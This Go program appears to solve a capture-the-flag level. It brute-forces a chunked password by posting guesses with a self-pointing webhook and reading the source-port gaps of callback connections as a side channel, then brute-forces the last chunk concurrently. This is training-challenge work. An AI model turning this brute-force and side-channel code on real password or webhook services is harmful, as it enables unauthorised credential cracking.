package main

import "net/http"
import "syscall"
import "log"
import "strings"
import "strconv"
import "os"
import "io/ioutil"
import "fmt"
import "time"
import "math/rand"
import "net"
import "math"
import "flag"

var listenPort string
var startTime time.Time

var currentGuess int
var currentGuessThrough int

var startedRun chan int
var incPortChan chan int
var wasSuccess chan bool

var currentChunk int
var previousChunks []int
var levelAddress string
var myHostname string

var totalGuessesSoFar int

var serverMode bool
var requests int

var SEEK_MODE = 1 // 0 = random, 1 = forwards, -1 = backwards

func knownSoFar() string {
	outputStr := ""
	for i := 0; i < 4; i++ {
		if currentChunk > i {
			outputStr += makeChunkNum(previousChunks[i])
		} else if currentChunk == i {
			outputStr += "___"
		} else {
			outputStr += "xxx"
		}
	}
	return outputStr
}

func terminalUpdater() {
	for {
		timeDiff := time.Now().Sub(startTime)
		// we can use how many guesses we've made
		// then calculate seconds/guess
		secondsPerGuess := timeDiff.Seconds() / float64(totalGuessesSoFar)
		// we can then calculate how many more guesses we think we'll need
		// we'll go for the case of 750 * number of chunks remaining - guesses for this chunk
		chunksRemaining := 4 - currentChunk
		guessesRemaining := float64((chunksRemaining * 750) - currentGuessThrough)
		// now we can multiply the two numbers together to get the number of seconds we need
		durationLeft := time.Duration(guessesRemaining*secondsPerGuess) * time.Second

		if !serverMode {
			fmt.Printf("Chunk #%d of 4 - guessing %03d (%02d%% guesses for this chunk exhausted) - running for %d:%02d - time remaining %v - known so far: %s              \r", currentChunk+1, currentGuess, (currentGuessThrough / 10), int(math.Floor(timeDiff.Minutes())), int64(math.Floor(timeDiff.Seconds()))%60, durationLeft, knownSoFar())
			time.Sleep(20 * time.Millisecond)
		} else {
			fmt.Printf("WORKING_ON %d %d\n", currentChunk, currentGuessThrough)
			time.Sleep(5 * time.Second)
		}
	}
}

func processIt() {
	var lastPort int
	lastPort = -1

	for {
		numToTry := <-startedRun
		currentGuess = numToTry

		var gotNum int
		wasOk := false

		// okay, we keep trying up to 10 times unless we get expectedMed
		expectedMed := currentChunk + 2
		i := 0
		for {
			var res bool
			res = pingIt(numToTry, true, (currentChunk == 0 && currentGuessThrough == 0))
			if currentChunk == 3 {
				wasOk = res
				break
			}
			thisPort := <-incPortChan
			gotNum = thisPort - lastPort
			if gotNum < 0 {
				gotNum += 10000
			}
			lastPort = thisPort
			if gotNum == expectedMed {
				break // we expected this number, sadly
			}
			if gotNum == expectedMed+1 {
				i++
			}
			if i == 5 {
				wasOk = true // ALL RIGHT
				break
			}
		}

		// tell it we're done
		wasSuccess <- wasOk
	}
}

func pingIt(num int, withWebhook bool, readResponse bool) bool {
	totalGuessesSoFar++
	// we need to mock up a string
	passStr := ""
	for i := 0; i < currentChunk; i++ {
		passStr += makeChunkNum(previousChunks[i])
	}
	passStr += makeChunkNum(num)
	for len(passStr) < 12 {
		passStr += "x"
	}
	finalStrStr := "{\"password\": \"" + passStr + "\", \"webhooks\": ["
	if withWebhook {
		finalStrStr += "\"" + myHostname + ":" + listenPort + "\""
	}
	finalStrStr += "]}"
	finalStr := strings.NewReader(finalStrStr)

	requests++
	resp, err := http.Post(levelAddress, "application/json", finalStr)
	if err != nil {
		log.Println("Whoops, error while HTTPing: " + err.Error())
		return false
	}
	defer resp.Body.Close()

	if !readResponse {
		return false
	}

	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "true") {
		// DING DING DING
		return true
	}
	if strings.Contains(string(body), "Nothing to see here") {
		// heh.
		if serverMode {
			fmt.Println("INVALID_URL")
		} else {
			log.Println("URL appears invalid. Double-check and retry.")
		}
		os.Exit(1)
	}
	return false
}

func makeChunkNum(num int) string {
	thisNumStr := strconv.FormatInt(int64(num), 10)
	for len(thisNumStr) < 3 {
		thisNumStr = "0" + thisNumStr
	}
	return thisNumStr
}

func strToInt(p string) int {
	a, _ := strconv.ParseInt(p, 10, 0)
	return int(a)
}

func performFinalChunkBruteforcing() int {
	// make multiple concurrent requests
	CONCURRENCY := 4
	// split the range up
	rangeSize := 1000 / CONCURRENCY

	currentGuessThrough = 0
	currentGuess = 0

	foundTheGuess := make(chan int)
	for i := 0; i < CONCURRENCY; i++ {
		go func(start int, rangeSize int, foundIt chan int) {
			for i := start; i < start+rangeSize; i++ {
				currentGuess = i
				currentGuessThrough++
				if pingIt(i, false, true) {
					log.Println("FOUND IT", i, "               ")
					foundTheGuess <- i
				}
			}
		}(rangeSize*i, rangeSize, foundTheGuess)
	}

	return <-foundTheGuess
}

func getAddressPort(address string) int {
	remBits := strings.Split(address, ":")
	if !strings.Contains(levelAddress, "127.0.0.1") && (remBits[0] == "127.0.0.1" || remBits[0] == "localhost") {
		return -1
	}

	port, _ := strconv.ParseInt(remBits[1], 10, 0)
	return int(port)
}

func generatePermSet(mode int) []int {
	if mode == 0 {
		return rand.Perm(1000)
	}

	return make([]int, 0)
}

func generatePermNumber(permSet []int, n int, mode int) int {
	if mode == 0 {
		return permSet[mode]
	} else if mode == 1 {
		return n
	}
	return 1000 - n
}

func main() {

	flag.BoolVar(&serverMode, "servermode", false, "Set for server message printing mode")
	flag.Parse()

	// seed the RNG
	rand.Seed(time.Now().UnixNano())

	currentChunk = 0
	previousChunks = make([]int, 4)
	startNumber := 0
	endNumber := 1000

	// port start_number max_number chunk1 chunk2 chunk3
	if flag.NArg() < 2 {
		log.Println("level08_address level02_host [chunk1 [chunk2 [chunk3]]]")
		os.Exit(1)
	}
	levelAddress = flag.Arg(0)
	myHostname = flag.Arg(1)

	if flag.NArg() > 2 {
		previousChunks[0] = strToInt(flag.Arg(2))
		currentChunk = 1
		if flag.NArg() > 3 {
			previousChunks[1] = strToInt(flag.Arg(3))
			currentChunk = 2
			if flag.NArg() > 4 {
				previousChunks[2] = strToInt(flag.Arg(4))
				currentChunk = 3
			}
		}
	}

	startedRun = make(chan int)
	incPortChan = make(chan int)
	wasSuccess = make(chan bool)
	requests = 0

	go processIt()

	wasBusy := true
	var listener net.Listener
	var err error
	// did they specify a port number?
	if strings.Contains(myHostname, ":") {
		// yes, they did
		splitBits := strings.Split(myHostname, ":")
		myHostname = splitBits[0]
		listenPort = splitBits[1]
		listener, err = net.Listen("tcp4", ":"+listenPort)
		if err != nil {
			log.Fatalln(err)
		}
	} else {
		for wasBusy {
			listenPort = strconv.FormatInt(int64(rand.Intn(4000)+2000), 10)
			listener, err = net.Listen("tcp4", ":"+listenPort)
			if err == nil {
				wasBusy = false
			}
		}
	}

	/** HTTP
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		incPortChan <- getAddressPort(r.RemoteAddr)
	})
	go http.Serve(listener, nil)
	**/
	// TCP mode
	go func(netListener net.Listener, outPort chan int) {
		defer netListener.Close()

		for {
			conn, err := netListener.Accept()
			if err != nil {
				log.Fatalln(err)
			}
			portN := getAddressPort(conn.RemoteAddr().String())
			if portN != -1 {
				outPort <- portN
				conn.Close()
			}
		}
	}(listener, incPortChan)

	startTime = time.Now()

	if !serverMode {
		log.Println("Listening on", listenPort)
		log.Println("I am going to ping", levelAddress, "and my hostname is", myHostname)
		fmt.Println()
		fmt.Println()
		defer fmt.Println()
		defer fmt.Println()
	} else {
		// wait for character
		tb := make([]byte, 1)
		var Stdin = os.NewFile(uintptr(syscall.Stdin), "/dev/stdin")
		Stdin.Read(tb)
		fmt.Println("STARTED")
	}
	go terminalUpdater()

	for ; currentChunk < 3; currentChunk++ {
		// generate my permutation set
		//permSet := generatePermSet(SEEK_MODE)
		for cN := startNumber; cN < endNumber; cN++ {
			currentGuessThrough = int(cN)
			//startedRun <- generatePermNumber(permSet, cN, SEEK_MODE)
			startedRun <- cN
			wasSuccess := <-wasSuccess
			if wasSuccess {
				//thisNum := generatePermNumber(permSet, cN, SEEK_MODE)
				//previousChunks[currentChunk] = thisNum
				previousChunks[currentChunk] = cN
				if serverMode {
					//fmt.Println("BROKE", currentChunk, generatePermNumber(permSet, cN, SEEK_MODE))
					fmt.Println("BROKE", currentChunk, cN)
				}
				break
			}
		}
	}

	// final chunk
	previousChunks[3] = performFinalChunkBruteforcing()
	currentChunk++

	// end time
	endTime := time.Now().Sub(startTime)
	if !serverMode {
		log.Printf("\nTook %s and %d requests.\n", endTime.String(), requests)
		log.Printf("The final result was: %s\n", knownSoFar())
	} else {
		fmt.Println("BROKE_ALL", knownSoFar())
	}
}
